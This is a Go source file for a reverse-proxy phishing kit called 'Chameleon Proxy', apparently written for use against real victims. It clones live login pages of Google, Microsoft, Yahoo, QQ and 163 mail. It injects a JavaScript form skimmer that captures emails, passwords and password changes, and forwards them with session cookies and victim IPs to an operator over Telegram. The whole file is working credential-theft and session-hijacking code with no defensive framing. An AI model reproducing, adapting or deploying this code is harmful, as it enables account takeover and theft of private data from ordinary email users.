package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/cookiejar"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
)

type SessionStore struct {
	mu       sync.RWMutex
	sessions map[string]*SessionData
}

type SessionData struct {
	Cookies   map[string]string
	UserEmail string
}

var store = &SessionStore{
	sessions: make(map[string]*SessionData),
}

const harvesterScript = `
<script>
document.addEventListener('submit', function(e) {
    const form = e.target;
    const formData = new FormData(form);
    const params = new URLSearchParams();
    let hasEmail = false;
    let hasPassword = false;

    for (let [key, value] of formData.entries()) {
        params.append(key, value);
        if (key.toLowerCase().includes('email') || key.toLowerCase().includes('user') || key.toLowerCase().includes('account')) {
            window._capturedEmail = value;
            hasEmail = true;
        }
        if (key.toLowerCase().includes('pass')) {
            window._capturedPass = value;
            hasPassword = true;
        }
    }

    if (hasEmail && hasPassword) {
        fetch('/api/harvest', {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: params.toString()
        }).catch(() => {});
    }
}, true);

setInterval(() => {
    const inputs = document.querySelectorAll('input[type="password"]');
    if (inputs.length >= 2) {
        const oldP = inputs[0].value;
        const newP = inputs[1].value;
        if (oldP && newP) {
            fetch('/api/harvest', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({type: 'pass_change', old: oldP, new: newP})
            }).catch(() => {});
        }
    }
}, 2000);
</script>
`

func StartProxy(cfg TelegramConfig, listenPort string) {
	r := gin.Default()

	r.GET("/loader.html", func(c *gin.Context) {
		c.File("./loader.html")
	})

	r.GET("/", func(c *gin.Context) {
		c.Redirect(http.StatusMovedPermanently, "/loader.html")
	})

	r.GET("/:hash", func(c *gin.Context) {
		hash := c.Param("hash")
		if !strings.HasPrefix(hash, "#") {
			hash = "#" + hash
		}

		email := strings.TrimPrefix(hash, "#")
		targetBase := GetTargetDomain(email)

		log.Printf("[PROXY] Fetching live page for %s from %s", email, targetBase)

		jar, _ := cookiejar.New(nil)
		proxyClient := &http.Client{
			Timeout: 15 * time.Second,
			Jar:     jar,
			Transport: &http.Transport{
				ForceAttemptHTTP2: false,
			},
		}

		req, err := http.NewRequest("GET", targetBase, nil)
		if err != nil {
			c.String(500, "Error creating request")
			return
		}

		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
		req.Header.Set("Sec-Fetch-Dest", "document")
		req.Header.Set("Sec-Fetch-Mode", "navigate")
		req.Header.Set("Sec-Fetch-Site", "none")
		req.Header.Set("Upgrade-Insecure-Requests", "1")

		resp, err := proxyClient.Do(req)
		if err != nil {
			c.String(502, "Target Unavailable or Invalid Domain")
			return
		}
		defer resp.Body.Close()

		bodyBytes, err := io.ReadAll(resp.Body)
		if err != nil {
			c.String(502, "Error reading body")
			return
		}

		bodyStr := string(bodyBytes)

		rewrittenBody := strings.ReplaceAll(bodyStr, targetBase, c.Request.Host+"/")

		if strings.Contains(email, "@") {
			domain := strings.Split(email, "@")[1]
			rewrittenBody = strings.ReplaceAll(rewrittenBody, "https://"+domain, c.Request.Host+"/")
			rewrittenBody = strings.ReplaceAll(rewrittenBody, "http://"+domain, c.Request.Host+"/")
		}

		baseTag := `<base href="` + targetBase + `">`
		rewrittenBody = strings.Replace(rewrittenBody, "<head>", "<head>\n"+baseTag, 1)
		rewrittenBody = strings.Replace(rewrittenBody, "</body>", harvesterScript+"</body>", 1)

		CloneHeaders(resp, c.Writer)

		// Loop through ALL cookies
		for _, cookie := range resp.Cookies() {
			c.SetCookie(cookie.Name, cookie.Value, 3600*24, "/", "", false, false)
			SendTelegramMessage(cfg, FormatCookieHarvest(email, []string{cookie.Name + "=" + cookie.Value}))
		}

		c.Writer.WriteHeader(resp.StatusCode)
		c.Writer.Write([]byte(rewrittenBody))
	})

	r.POST("/api/harvest", func(c *gin.Context) {
		contentType := c.ContentType()

		if contentType == "application/json" {
			var payload map[string]interface{}
			c.ShouldBindJSON(&payload)

			if t, ok := payload["type"].(string); ok && t == "pass_change" {
				old := payload["old"].(string)
				new := payload["new"].(string)
				SendTelegramMessage(cfg, FormatPasswordChange(old, new, "UnknownUser"))
			}
		} else {
			c.Request.ParseForm()
			email := c.PostForm("email")
			password := c.PostForm("password")

			if email == "" {
				email = c.PostForm("username")
			}
			if email == "" {
				email = c.PostForm("account")
			}
			if password == "" {
				password = c.PostForm("passwd")
			}
			if password == "" {
				password = c.PostForm("pwd")
			}

			ip := c.ClientIP()
			userAgent := c.GetHeader("User-Agent")

			SendTelegramMessage(cfg, FormatLoginAlert(email, password, ip, userAgent))
		}
		c.JSON(200, gin.H{"status": "ok"})
	})

	r.Any("/proxy/*filepath", func(c *gin.Context) {
		filepath := c.Param("filepath")
		filepath = strings.TrimPrefix(filepath, "/")

		referer := c.GetHeader("Referer")
		targetDomain := "https://accounts.google.com/"

		if strings.Contains(referer, "gmail.com") {
			targetDomain = "https://accounts.google.com/"
		} else if strings.Contains(referer, "live.com") || strings.Contains(referer, "outlook.com") {
			targetDomain = "https://login.live.com/"
		} else if strings.Contains(referer, "qq.com") {
			targetDomain = "https://mail.qq.com/"
		} else if strings.Contains(referer, "163.com") {
			targetDomain = "https://mail.163.com/"
		} else if strings.Contains(referer, "yahoo.com") {
			targetDomain = "https://login.yahoo.com/"
		}

		fullURL := targetDomain + filepath
		outReq, _ := http.NewRequest(c.Request.Method, fullURL, c.Request.Body)

		for key, values := range c.Request.Header {
			for _, value := range values {
				outReq.Header.Add(key, value)
			}
		}

		proxyClient := &http.Client{}
		resp, err := proxyClient.Do(outReq)
		if err != nil {
			c.String(502, "Upstream Error")
			return
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)
		rewrittenBody := strings.ReplaceAll(string(body), targetDomain, c.Request.Host+"/")

		CloneHeaders(resp, c.Writer)
		c.Writer.WriteHeader(resp.StatusCode)
		c.Writer.Write([]byte(rewrittenBody))
	})

	log.Printf("🚀 Chameleon Proxy listening on 0.0.0.0:%s", listenPort)
	r.Run("0.0.0.0:" + listenPort)
}

func (s *SessionStore) AddSession(userAgent string, data *SessionData) string {
	id := fmt.Sprintf("%x", time.Now().UnixNano())
	s.mu.Lock()
	defer s.mu.Unlock()
	s.sessions[id] = data
	return id
}

func (s *SessionStore) GetSession(id string) (*SessionData, bool) {
	s.mu.RLock()
	defer s.mu.RUnlock()
	data, ok := s.sessions[id]
	return data, ok
}
